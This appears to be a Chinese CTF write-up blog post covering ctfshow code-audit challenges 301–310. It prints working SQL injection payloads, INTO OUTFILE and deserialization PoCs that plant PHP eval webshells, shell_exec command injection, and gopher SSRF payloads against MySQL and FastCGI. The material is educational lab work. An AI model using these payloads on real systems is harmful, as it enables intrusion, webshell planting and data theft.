---
title: ctfshow-代码审计
id: ctfshow-代码审计
---

<!-- more -->

整个国庆都在刷终极考核，第一台机子拿了shell但是没能提权，看了4天linux提权
和群主交流的时候他说挺简单，应该是我信息收集没到位；

虽然前面的提权都没成，但也学到很多东西

明天晚上就回学校了，今天就抽点时间做一下代码审计这一块放松放松~


## 301 sql注入

本来打算用seay审一下，但是啥也没有，大概是没有危险函数？
手动审一下

checklogin.php，sql语句没有过滤

```php
$sql="select sds_password from sds_user where sds_username='".$username."' order by id limit 1;";
```

没回显就不注了，可以sqlmap一把梭，账户密码：`admin/ctfshowwwww`

![](https://i.loli.net/2021/10/06/9SvGmP1j4J7s8CB.png)

或者尝试写马

```sql
userid=' union select "<?php eval($_GET[1]);" into outfile "/var/www/html/a.php" --+
```

## 302 sql注入

> hint:
>
> 修改的地方：
>
> ```php
> if(!strcasecmp(sds_decode($userpwd),$row['sds_password'])){
> ```

也就是比原本加了个sds_decode()，找到fun.php里

```php
function sds_decode($str){
	return md5(md5($str.md5(base64_encode("sds")))."sds");
}
```

数据库里还是`admin/ctfshowwwww`，所以用这个登录是登不进的
想符合比较需要：
传入的userid经过sds_decode后等于`ctfshowwwww`，个人感觉不太可行

### 解法1：

可以看到username只是作为where的条件进行查询，真正进行判断的还是userpwd

那么利用联合查询的特性伪造一个密码出来：

![](https://i.loli.net/2021/10/06/QbZBImkE4wY3v5M.png)

```
userid=-1' union select "d9c77c4e454869d5d8da3b4be79694d3" %23&userpwd=1
```

![](https://i.loli.net/2021/10/06/jasWfrboUZkGtwc.png)

相关原理这里不赘述，自己本地试![](https://i.loli.net/2021/10/06/yiz5XrtLZxg8DQ1.png)

### 解法2：

sql语句依然没有添加过滤，也能正常被执行，那么写马还是可以的

```php
userid=' union select "<?php eval($_GET[1]);" into outfile "/var/www/html/a.php" --+
```



## 303 sql注入

这次seay有审到：dptadd.php，还是sql注入![](https://i.loli.net/2021/10/06/puIAoJWvV164XiZ.png)

```php
$sql="insert into sds_dpt set sds_name='".$dpt_name."',sds_address ='".$dpt_address."',sds_build_date='".$dpt_build_year."',sds_have_safe_card='".$dpt_has_cert."',sds_safe_card_num='".$dpt_cert_number."',sds_telephone='".$dpt_telephone_number."';";
```

`if(!isset($_SESSION['login']))`得先登录

这里我本来是想像302一样进去的，但是失败了，还给我弹回个东西

![](https://i.loli.net/2021/10/06/8HPCD7xSZgFT6zy.png)

重新审一下源码：checklogin.php

![](https://i.loli.net/2021/10/06/lijGn2ATLOZuhq4.png)

username长度不得超过6，所以方法不奏效了~
并且引用了fun.php，加了一句`echo sds_decode("admin");`
那么尝试admin/admin登入

成功，然后就是在dptadd.php里注入了

```
dpt_name=1',sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())--+
```

```
dpt_name=1',sds_address=(select group_concat(column_name) from information_schema.columns where table_name='sds_fl9g')--+
```

```
dpt_name=1',sds_address=(select flag from sds_fl9g)--+
```

![](https://i.loli.net/2021/10/06/kBmEWNKOJ6AGSLU.png)



## 304 sql注入

> hint:
>
> 增加了全局waf
>
> ```php
> function sds_waf($str){
> 	return preg_match('/[0-9]|[a-z]|-/i', $str);
> }
> ```
>
> 

奇怪的是没发现waf，上面的payload还是能用，只不过改了表名：sds_flaag

```
dpt_name=1',sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())--+
```

```
dpt_name=1',sds_address=(select group_concat(column_name) from information_schema.columns where table_name='sds_flaag')--+
```

```
dpt_name=1',sds_address=(select flag from sds_flaag)--+
```



## 305 反序列化传马

丢给seay扫![](https://i.loli.net/2021/10/06/Zl8Luz195PMbqdc.png)

先看一下dptadd.php，每个变量都被加上了waf，sql注入大概g了

```php
function sds_waf($str){
	if(preg_match('/\~|\`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\{|\}|\[|\]|\;|\:|\'|\"|\,|\.|\?|\/|\\\|\<|\>/', $str)){
		return false;
	}else{
		return true;
	}
}
```

再看class.php：

```php
class user{
	public $username;
	public $password;
	public function __construct($u,$p){
		$this->username=$u;
		$this->password=$p;
	}
	public function __destruct(){
		file_put_contents($this->username, $this->password);
	}
}
```

好像可以file_put_contents写马~，再看看再哪里可以触发反序列化
在checklogin.php找到：![](https://i.loli.net/2021/10/06/cZrLxEUkWYApJtX.png)

那么构造payload在cookie传进去就可以了

poc:

```php
<?php

class user{
    public $username = 'a.php';
    public $password = '<?php eval($_POST[1]);?>';
}

$a = new user();
echo urlencode(serialize($a));


# O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22a.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D
```

![](https://i.loli.net/2021/10/06/Nlok7mSn6TeLZ4h.png)

flag还是在数据库里，拿哥斯拉（哥斯拉连好像只能连post的马--）或者蚁剑连一下：

![](https://i.loli.net/2021/10/06/J7ugztwWy3vNIbV.png)



## 306 反序列化传马

> hint: 开始使用mvc结构
>
> 即模型-视图-控制器

审计会发现存在许多类和函数作为控制器

seay扫一下危险函数，找到class.php log类的close()

```php
class log{
	public $title='log.txt';
	public $info='';
	public function loginfo($info){
		$this->info=$this->info.$info;
	}
	public function close(){
		file_put_contents($this->title, $this->info);
	}
}
```

再看在哪会调用到close()

![](https://i.loli.net/2021/10/06/6OK2LMUqgoYk17l.png)

dao.php: （require class.php）

![](https://i.loli.net/2021/10/06/YVGdTWU5nfE1Do9.png)

那么只要让dao->conn为log类，就会在反序列化时触发close方法~

再找包含dao.php进行反序列化的地方

index.php:

```php
<?php
session_start();
require "conn.php";
require "dao.php";
$user = unserialize(base64_decode($_COOKIE['user']));
# ...
```

poc:

```php
<?php

class dao{
    private $conn;
        public function __construct(){
        $this->conn=new log();
    }
}

class log{
    public $title='a.php';
    public $info='<?php eval($_POST[1]);?>';
}

$a = new dao();
echo base64_encode(serialize($a));
```

还是传到cookie里，然后访问一下index.php就可以把马写入了

![](https://i.loli.net/2021/10/06/R9jLMI34XQyoP6s.png)

flag在flag.php里



## 307 反序列化传马

> 是不是顺眼多了

把文件分类放好了，seay一扫发现两个：![](https://i.loli.net/2021/10/06/YvhdcNmqJ9QCf7T.png)
找到shell_exec在dao.php里

```php
	public function  clearCache(){
		shell_exec('rm -rf ./'.$this->config->cache_dir.'/*');
	}
```

再找调用它的地方

![](https://i.loli.net/2021/10/06/U6zXYIWpMs8R7hb.png)

看了一下，决定在logout.php操作

```php
$service = unserialize(base64_decode($_COOKIE['service']));
if($service){
	$service->clearCache();
}
```

poc：

```php
<?php

class config{
    public $cache_dir = ';echo  "<?php eval(\$_POST[1]);?>" > a.php;';
}

class dao{
    private $config;
        public function __construct(){
        $this->config=new config();
    }
}


$a = new dao();
echo base64_encode(serialize($a));

# TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czo5OiJjYWNoZV9kaXIiO3M6NDM6IjtlY2hvICAiPD9waHAgZXZhbChcJF9QT1NUWzFdKTs/PiIgPiBhLnBocDsiO319
```

操作同上



## 308 ssrf-mysql

> 需要拿shell

307的利用点增加了过滤，把字母都给都ban掉了

```php
	public function  clearCache(){
		if(preg_match('/^[a-z]+$/i', $this->config->cache_dir)){
			shell_exec('rm -rf ./'.$this->config->cache_dir.'/*');
		}
	}
```

这次seay帮不到咱了，手动找一下其他利用点

看到fun.php多了个checkUpdate函数，很眼熟的，应该是ssrf

```php
function checkUpdate($url){
		$ch=curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		$res = curl_exec($ch);
		curl_close($ch);
		return $res;
	}
```

调用的地方在dao.php

```php
	public function checkVersion(){
		return checkUpdate($this->config->update_url);
	}
```

然后再跟踪到：index.php

![](https://i.loli.net/2021/10/06/aHbASUm6o5QFdwI.png)

```php
<?php
session_start();
error_reporting(0);
require 'controller/service/service.php';
if(!isset($_SESSION['login'])){
header("location:login.php");
}
$service = unserialize(base64_decode($_COOKIE['service']));
if($service){
    $lastVersion=$service->checkVersion();
}
?>
```

类似308，ssrf的payload用gopherus生成就好

`ps：看309提示,猜测这里打的是无密码的mysql，但具体不知咋测~`

![](https://i.loli.net/2021/10/06/LfPW7mFKio2nMSr.png)

poc：

```php
<?php

class config{
    public $update_url = 'gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%46%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%27%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%61%2e%70%68%70%27%3b%01%00%00%00%01';
}

class dao{
    private $config;
        public function __construct(){
        $this->config=new config();
    }
}


$a = new dao();
echo base64_encode(serialize($a));
```



## 309 ssrf-fastcgi

> 需要拿**shell**，308的方法不行了,mysql 有密码了

mysql有密码了，看了一下yu师傅的wp：

> 打的是fastcgi，可以通过gopher协议的延时判断:
>
> ```
> gopher://127.0.0.1:9000
> ```

那么还是gopherus生成payload

![](https://i.loli.net/2021/10/06/Q4K1zFBkwagtfIp.png)

poc:

```php
<?php

class config{
    public $update_url = 'gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27tac%20f%2A%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00';
}   

class dao{
    private $config;
    public function __construct(){
        $this->config=new config();
    }
}
$a=new dao();
echo base64_encode(serialize($a));
```

![](https://i.loli.net/2021/10/06/91WhrYvAxwkKIMD.png)



## 310 ssrf-fastcgi|file

后面查配置文件，端口9000开着，fastcgi也还可以打~

### 解法1

fastcgi还可以打，但是cat 不到flag，就用find命令找了一下，存在`/var/flag`

![](https://i.loli.net/2021/10/06/NrKyDcA8i4V2U7o.png)

尝试cat一下，但是读不出；又尝试`ls -l /var/flag`看是否是权限问题，回显得到的是index.html，说明flag是个目录

那么：`cat /var/flag/index.html`即可

![](https://i.loli.net/2021/10/06/jUbnmlVtX9vs7So.png)



### 解法2

yu师傅的解法

用file协议访问nginx的配置文件

```php
<?php
class config{
    public $update_url = 'file:///etc/nginx/nginx.conf';
}   

class dao{
    private $config;
    public function __construct(){
        $this->config=new config();
    }
}
$a=new dao();
echo base64_encode(serialize($a));
# TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czoyODoiZmlsZTovLy9ldGMvbmdpbngvbmdpbnguY29uZiI7fX0=
```

![](https://i.loli.net/2021/10/06/GSRQl1qwTaXI3bN.png)

```nginx
	server {
        listen       4476;
        server_name  localhost;
        root         /var/flag;
        index index.html;

        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

那么访问127.0.0.1:4476即可

```php
<?php
class config{
    public $update_url = 'http://127.0.0.1:4476';
}   

class dao{
    private $config;
    public function __construct(){
        $this->config=new config();
    }
}
$a=new dao();
echo base64_encode(serialize($a));

# TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czoyMToiaHR0cDovLzEyNy4wLjAuMTo0NDc2Ijt9fQ==
```

![](https://i.loli.net/2021/10/06/42sLS5UhyjRMlmC.png)



